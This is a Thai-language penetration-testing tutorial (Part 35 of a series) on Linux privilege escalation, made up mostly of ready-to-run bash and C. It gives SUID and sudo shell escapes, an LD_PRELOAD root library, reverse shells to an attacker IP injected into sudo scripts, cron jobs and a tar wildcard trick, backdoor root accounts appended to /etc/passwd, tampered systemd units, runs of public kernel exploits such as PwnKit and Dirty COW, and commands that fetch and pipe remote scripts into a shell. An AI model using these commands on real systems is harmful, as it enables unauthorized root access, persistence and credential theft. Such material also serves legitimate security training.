# Part 35: Linux Privilege Escalation

## สารบัญ
1. [ภาพรวม Linux PrivEsc](#1-ภาพรวม-linux-privesc)
2. [SUID/SGID Exploitation](#2-suidsgid-exploitation)
3. [Sudo Misconfigurations](#3-sudo-misconfigurations)
4. [Writable Files และ Cron Jobs](#4-writable-files-และ-cron-jobs)
5. [Kernel Exploits](#5-kernel-exploits)
6. [PATH Hijacking](#6-path-hijacking)
7. [Weak Service Permissions](#7-weak-service-permissions)
8. [Capabilities](#8-capabilities)
9. [เครื่องมือ Automated PrivEsc](#9-เครื่องมือ-automated-privesc)
10. [สรุป](#10-สรุป)

---

## 1. ภาพรวม Linux PrivEsc

### Enumeration เบื้องต้น

```bash
# ============================================
# คำสั่งพื้นฐานหลังได้ศัลล access
# ============================================

# System info
id                          # uid, gid, groups
uname -a                    # kernel version
cat /etc/os-release         # distro info
hostname
cat /proc/version
lscpu                       # CPU info

# User info
whoami
id
groups
cat /etc/passwd             # all users
cat /etc/group              # all groups
cat /etc/shadow             # password hashes (ถ้าอ่านได้)
ls -la /home/               # home directories

# Sudo
sudo -l                     # sudo permissions!

# Network
ifconfig
ip a
ss -tulnp                   # listening services
netstat -anltp
cat /etc/hosts
cat /etc/resolv.conf
arp -a

# Processes
ps aux
ps axjf                     # process tree
top
```

### System Files Recon

```bash
# ============================================
# หาความเสี่ยงจากไฟล์
# ============================================

# Config files
find / -name "*.conf" -readable 2>/dev/null | head
find / -name "*.cfg" -readable 2>/dev/null | head
find / -name "*.ini" -readable 2>/dev/null | head
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name ".env" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
ls -la ~/.ssh/

# Bash history
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history 2>/dev/null

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Interesting files
find / -name "*.txt" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "password*" 2>/dev/null
find / -type f -name "*.sh" -readable 2>/dev/null
```

---

## 2. SUID/SGID Exploitation

### ค้นหา SUID Binaries

```bash
# ============================================
# หาไฟล์ SUID (Set User ID)
# ============================================

find / -perm -4000 -type f 2>/dev/null
# -rwsr-xr-x 1 root root /usr/bin/sudo
# -rwsr-xr-x 1 root root /usr/bin/pkexec
# -rwsr-xr-x 1 root root /bin/bash  <- อันตราย!

# SGID
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm -6000 -type f 2>/dev/null

# ดูเอาเฉพาะ non-standard
find / -perm -4000 -type f 2>/dev/null | grep -v "/usr/bin/\|/usr/sbin/\|/bin/\|/sbin/"
```

### GTFOBins

```bash
# ============================================
# GTFOBins - เว็บสำหรับ SUID/sudo bypass
# https://gtfobins.github.io/
# ============================================

# ============================================
# /bin/bash SUID
# ============================================
ls -la /bin/bash
# -rwsr-xr-x 1 root root ...

/bin/bash -p
# bash-5.1# whoami
# root

# ============================================
# find SUID
# ============================================
find / -exec /bin/sh -p \; -quit
# # whoami
# root

# ============================================
# nmap SUID (เวอร์ชันเก่า)
# ============================================
nmap --interactive
nmap> !sh
# # id
# uid=0(root)

# ============================================
# vim/vi SUID
# ============================================
vim -c ':!whoami'
vim -c ':shell'

# ============================================
# less SUID
# ============================================
less /etc/passwd
# ใน less: !/bin/bash

# ============================================
# python SUID
# ============================================
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# ============================================
# cp SUID (แก้ไข passwd)
# ============================================
openssl passwd -1 -salt hacker password123
# $1$hacker$hash
echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su hacker  # password: password123

# ============================================
# env SUID
# ============================================
env /bin/sh -p

# ============================================
# awk SUID
# ============================================
awk 'BEGIN {system("/bin/bash -p")}'

# ============================================
# man SUID
# ============================================
man man
# !/bin/bash -p
```

---

## 3. Sudo Misconfigurations

### Sudo Bypass Techniques

```bash
# ============================================
# sudo -l ก่อนเสมอ
# ============================================
sudo -l
# Matching Defaults entries for www-data:
#   env_reset, mail_badpass
# User www-data may run the following commands:
#   (root) NOPASSWD: /usr/bin/vim
#   (root) NOPASSWD: /bin/cat /var/log/*
#   (root) ALL: NOPASSWD: ALL   <- สิทธิ์ทั้งหมด!

# ============================================
# ALL Permissions
# ============================================
sudo /bin/bash
sudo su -
sudo -s

# ============================================
# sudo vim
# ============================================
sudo vim -c ':!bash'
# root@host:~# 

# ============================================
# sudo find
# ============================================
sudo find / -exec /bin/bash \; -quit
sudo find /etc -name passwd -exec /bin/bash \;

# ============================================
# sudo less/more
# ============================================
sudo less /etc/passwd
# v -> เข้า vi
# :!bash

# ============================================
# sudo cat / wildcards
# ============================================
# (root) NOPASSWD: /bin/cat /var/log/*
# ใช้ path traversal!
sudo cat /var/log/../../../etc/shadow

# ============================================
# sudo python/perl/ruby
# ============================================
sudo python3 -c 'import os; os.system("/bin/bash")'  
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'

# ============================================
# sudo LD_PRELOAD environment injection
# ============================================
# Defaults ไม่มี env_reset
# หรือมี env_keep+=LD_PRELOAD

# สร้าง evil.c
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# ใช้งาน
sudo LD_PRELOAD=/tmp/evil.so vim
# root# 
```

### Sudo with Script

```bash
# ============================================
# Scenario: อนุญาตรัน /opt/backup.sh
# ============================================
sudo -l
# (root) NOPASSWD: /opt/backup.sh

cat /opt/backup.sh
# #!/bin/bash
# tar czf /tmp/backup.tar.gz /home/

# ถ้าเขียนได้:
ls -la /opt/backup.sh
# -rwxrwxr-x 1 root root

# แก้ไข script
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> /opt/backup.sh

# รับชั่วคราว
# Kali terminal:
nc -lvnp 4444

# Target:
sudo /opt/backup.sh
# ได้ root shell!
```

---

## 4. Writable Files และ Cron Jobs

### ค้นหาไฟล์ที่เขียนได้

```bash
# ============================================
# ค้นหา world-writable files
# ============================================
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -perm -2 -type f 2>/dev/null | grep -v proc

# ค้นหาไฟล์ที่ owner เขียนได้
find / -user $(whoami) -type f 2>/dev/null | grep -v proc
find /etc -writable -type f 2>/dev/null
find /var -writable -type f 2>/dev/null

# /etc/passwd เขียนได้
ls -la /etc/passwd
# -rw-rw-r-- 1 root root  <- writable!

# เพิ่ม root user
openssl passwd password123
# $6$/aBc.../xxxhash
echo 'rootme:$6$xxx:0:0:root:/root:/bin/bash' >> /etc/passwd
su rootme  # password: password123
# root# 
```

### Cron Job Exploitation

```bash
# ============================================
# ค้นหา cron jobs
# ============================================
cat /etc/crontab
# * * * * * root /opt/cleanup.sh

ls -la /opt/cleanup.sh
# -rw-rw-rw- 1 root root  <- world-writable!

# แก้ script
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' >> /opt/cleanup.sh

# รอใน Kali:
nc -lvnp 4444
# root จะ connect มาเมื่อ cron ทำงาน

# ============================================
# Cron with missing script (PATH abuse)
# ============================================
# crontab: * * * * * root cleanup
# cleanup ไม่ได้ระบุ path!

echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# ถ้าเขียนไฟล์ใน directory แรกของ PATH
cat > /usr/local/sbin/cleanup << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /usr/local/sbin/cleanup

# รอ cron ทำงาน -> /bin/bash จะมี SUID
/bin/bash -p
# bash# id
# uid=1000(user) gid=1000(user) euid=0(root)
```

### Tar Wildcard Injection

```bash
# ============================================
# Cron: tar czf /backup/backup.tar.gz /home/*
# ============================================

# tar รองรับ --checkpoint-action เป็น args

# สร้างไฟล์ exploit
cd /home/victim
echo 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1' > shell.sh
chmod +x shell.sh

# สร้างไฟล์ที่ชื่อเป็น tar flags
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# ls /home/victim:
# --checkpoint=1
# --checkpoint-action=exec=sh shell.sh
# shell.sh

# เมื่อ cron รัน tar /home/* =>
# tar czf ... /home/victim/--checkpoint=1 /home/victim/--checkpoint-action=exec=sh shell.sh
# = tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh
# = รัน shell.sh
```

---

## 5. Kernel Exploits

```bash
# ============================================
# ค้นหา kernel version
# ============================================
uname -r
# 5.4.0-135-generic

uname -a
# Linux victim 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

# ค้นหา exploits:
# searchsploit linux kernel 5.4

# ============================================
# CVE-2021-4034 - pkexec LPE (PwnKit)
# ทุก Linux distro, polkit < 0.120
# ============================================

# Download PoC
git clone https://github.com/ly4k/PwnKit.git
cd PwnKit
make
./PwnKit
# root# 

# หรือ compile from source:
cat > PwnKit.c << 'EOF'
// PoC code (truncated for space)
// See: https://github.com/ly4k/PwnKit
EOF
gcc -o PwnKit PwnKit.c
./PwnKit

# ============================================
# CVE-2016-5195 - Dirty COW
# Linux kernel < 4.8.3
# ============================================

git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow.github.io
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123
# /etc/passwd ถูกแก้ไข
# firefart:$...:0:0:pwned:/root:/bin/bash
su firefart  # password: password123

# ============================================
# CVE-2021-3156 - Sudo Baron Samedit
# sudo < 1.9.5p2
# ============================================

sudo --version
# sudo version 1.8.31 <- vulnerable!

git clone https://github.com/worawit/CVE-2021-3156.git
python3 exploit_nss.py
# root# 

# ============================================
# Local exploit suggester (Metasploit)
# ============================================
meterpreter > run post/multi/recon/local_exploit_suggester
# [+] exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: vulnerable
# [+] exploit/linux/local/cve_2021_3156_sudo_baron_samedit: vulnerable
# [+] exploit/linux/local/cve_2022_0847_dirty_pipe: vulnerable

# ============================================
# LinPEAS - หา kernel vulnerabilities
# ============================================
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# [+] CVE-2021-4034 - pkexec vulnerable!
```

---

## 6. PATH Hijacking

```bash
# ============================================
# PATH Hijacking - เมื่อ binary ใช้ชื่อเมนูไม่เต็ม
# ============================================

# ดู binary ที่เริ่ม SUID
# strings <binary> | grep PATH
# หรือ ltrace / strace

file /usr/local/bin/suid_binary
strings /usr/local/bin/suid_binary
# ...
# /bin/sh
# service networking restart  <- ใช้ service โดยไม่ระบุ full path!
# ...

# strace
strace -e execve /usr/local/bin/suid_binary 2>&1 | grep "exec"
# execve("service", ...)  <- ไม่ระบุ full path!

# ============================================
# Exploit PATH hijacking
# ============================================

# เพิ่ม /tmp เข้าไปใน PATH (front)
export PATH=/tmp:$PATH

# สร้าง fake 'service'
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# รัน SUID binary
/usr/local/bin/suid_binary
# bash# whoami
# root
```

---

## 7. Weak Service Permissions

```bash
# ============================================
# ค้นหา services ที่เราเขียน/แก้ไขได้
# ============================================

# Systemd services
systemctl list-unit-files --type=service
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/

# หา service ที่เราเขียนได้
find /etc/systemd -writable 2>/dev/null
find /lib/systemd -writable 2>/dev/null

# ============================================
# Writable service file
# ============================================
ls -la /etc/systemd/system/webapp.service
# -rw-rw-r-- 1 root www-data  <- เขียนได้!

cat /etc/systemd/system/webapp.service
# [Unit]
# Description=Web App
# [Service]
# ExecStart=/opt/webapp/start.sh
# User=www-data
# [Install]
# WantedBy=multi-user.target

# แก้ไข service
cat > /etc/systemd/system/webapp.service << 'EOF'
[Unit]
Description=Web App
[Service]
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
User=root
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl restart webapp
/bin/bash -p
# bash# whoami
# root

# ============================================
# ไฟล์ที่ service เรียกใช้เขียนได้
# ============================================
cat /opt/webapp/start.sh
# #!/bin/bash
# cd /opt/webapp && python3 app.py

ls -la /opt/webapp/start.sh
# -rwxrwxr-x 1 root root  <- world-writable!

echo 'chmod +s /bin/bash' >> /opt/webapp/start.sh
sudo systemctl restart webapp  # ถ้ามีสิทธิ์
/bin/bash -p
```

---

## 8. Capabilities

```bash
# ============================================
# Linux Capabilities
# ============================================

# หาไฟล์ที่มี capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3.10 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/ruby2.7 = cap_setuid+ep
# /usr/bin/rview = cap_chown+ep

# ============================================
# cap_setuid - เปลี่ยน UID
# ============================================
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root# 

perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'

ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# ============================================
# cap_net_raw - sniff network
# ============================================
getcap -r / 2>/dev/null | grep net_raw
# /usr/sbin/tcpdump = cap_net_raw+eip
tcpdump -i eth0 -w /tmp/capture.pcap

# ============================================
# cap_chown - เปลี่ยนเจ้าของไฟล์
# ============================================
if [ "$(getcap /usr/bin/python3)" ]; then
  python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
  cat /etc/shadow  # อ่านได้แล้ว!
fi
```

---

## 9. เครื่องมือ Automated PrivEsc

### LinPEAS

```bash
# ============================================
# LinPEAS - Linux Privilege Escalation Awesome Script
# ============================================

# Download และรัน
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee /tmp/linpeas_output.txt

# หรือ upload จาก Kali
# Kali:
cp /usr/share/peass/linpeas/linpeas.sh /var/www/html/
python3 -m http.server 80
# Target:
curl http://192.168.1.50/linpeas.sh | bash

# หรือ
wget http://192.168.1.50/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# สีใน output:
# แดง = สำคัญมาก
# เหลือง = สำคัญ
# เขียว = ข้อมูลทั่วไป

# LinPEAS checks:
# - Sudo permissions
# - SUID/SGID binaries  
# - Cron jobs
# - Writable files
# - Services
# - Network connections
# - Containers (Docker, LXC)
# - Cloud metadata
# - Kernel exploits
# - Environment variables
```

### LinEnum

```bash
# ============================================
# LinEnum - Another enumeration script
# ============================================

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh -t -r /tmp/LinEnum_output.txt
# -t = thorough
# -r = save to file
# -k = keyword search
```

### GTFOBins Cheat Sheet

```bash
# ============================================
# Quick reference - common SUID exploits
# ============================================

# bash
/bin/bash -p

# python
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# find
find . -exec /bin/sh -p \; -quit

# vim/vi
vim -c ':!sh'

# less
less /etc/passwd -> !/bin/sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# perl
perl -e 'exec "/bin/sh"'

# ruby
ruby -e 'exec "/bin/sh"'

# node
node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'

# cp / overwrite /etc/passwd
cp /tmp/evil_passwd /etc/passwd

# env
env /bin/sh -p

# man -> press v in pager
man man  # then v, :!sh

# nmap
nmap --interactive  # then !sh

# dd -> overwrite files
echo "root::0:0:root:/root:/bin/bash" | dd of=/etc/passwd

# tee
echo root::0:0:root:/root:/bin/bash | tee /etc/passwd

# cut/grep -> read files
cut -d "" -f1 /etc/shadow

# ============================================
# Sudo bypass (same binaries)
# ============================================
sudo vim -c ':!sh'
sudo find / -exec /bin/sh \; -quit
sudo awk 'BEGIN{system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo less /etc/shadow
sudo perl -e 'exec "/bin/sh"'
sudo env /bin/sh
```

---

## 10. สรุป

### Summary Table

| เทคนิค | วิธี |
|---------|-----|
| SUID/SGID | หาด้วย find, ใช้ GTFOBins |
| Sudo | sudo -l, bypass editors/scripts |
| Cron | แก้ script, wildcard injection |
| Kernel | PwnKit, Dirty COW, Baron Samedit |
| PATH | Inject /tmp, fake binary |
| Service | แก้ unit file, replace binary |
| Capabilities | cap_setuid, cap_chown |
| Automation | LinPEAS, LinEnum |

### Checklist

```
[ ] id / sudo -l / uname -r
[ ] SUID: find / -perm -4000
[ ] Cron jobs writable
[ ] Writable /etc/passwd
[ ] Kernel version -> searchsploit
[ ] PATH injection opportunity
[ ] Capabilities: getcap -r /
[ ] LinPEAS run
[ ] GTFOBins check สำหรับ sudo/SUID
```

---

**ต่อไป**: [Part 36 - Windows Privilege Escalation](Part-36-Windows-Privilege-Escalation.md)
